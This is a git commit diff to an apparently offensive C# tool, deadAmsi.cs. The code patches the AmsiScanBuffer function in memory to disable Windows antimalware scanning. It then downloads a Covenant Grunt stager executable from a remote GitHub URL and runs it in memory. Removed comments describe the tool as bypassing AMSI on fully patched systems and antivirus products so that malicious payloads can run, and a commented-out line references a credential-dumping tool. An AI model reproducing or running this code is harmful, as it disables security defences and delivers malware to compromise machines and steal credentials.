b69a4ac5cfeb513ab0a2539e7e93a1ae3c6309a8
deadone <45006877+deadone@users.noreply.github.com>
2020-11-19 08:46:58 -0700

    Update deadAmsi.cs

--- c#/deadAmsi.cs
+++ c#/deadAmsi.cs
@@ -2,37 +2,40 @@ using System;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
-// mcs deadAmsi.cs
-// run on client machine to bypass AMSI and download malicious executable to memory
-// works on fully patched AV and windows builds
-// tested with: covenant, cobaltstrike, netcat, meterpreter payloads
-// tested against BitDefender, Norton, and Windows Defender
 
-namespace deadPie
+namespace deadAmsi
 {
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        private static void Main(string[] args)
         {
             var client = new WebClient();
-            // change download string to executable on remote server
-            var deadGet = client.DownloadData("http://10.0.0.0/picnic.exe");
-            client.Dispose();
-            var deadDll = LoadLibrary("amsi.dll");
-            var deadFind = GetProcAddress(deadDll, "AmsiScanBuffer");
-            var deadReturn = new byte[] { 0xC3 };
-            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, 0x40, out uint oldProtect);
-            Marshal.Copy deadReturn, 0, deadFind, deadReturn.Length);
-            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, oldProtect, out uint _);
-            var asm = Assembly.Load(deadGet);
-            var type = asm.GetType("deadGet.deadGet");
+            var gruntStager = client.DownloadData("https://github.com/deadone/scripting-dev/raw/master/other/deadpayload.exe");
+
+            var amsiDll = Win32.LoadLibrary("amsi.dll");
+            var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
+            var ret = new byte[] { 0xC3 };
+
+            //var katz = File.ReadAllBytes(@"C:\tools\SafetyKatz\SafetyKatz\bin\Debug\SafetyKatz.exe");
+            //var asm = Assembly.Load(katz);
+
+            Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
+            Marshal.Copy(ret, 0, asbAddress, ret.Length);
+            Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
+
+            var asm = Assembly.Load(gruntStager);
+            var type = asm.GetType("GruntStager.GruntStager");
             var instance = Activator.CreateInstance(type);
-            type.InvokeMember("deadGet", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
+            type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
         }
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
+    }
+
+    class Win32
+    {
+        [DllImport("kernel32.dll")]
         public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     }
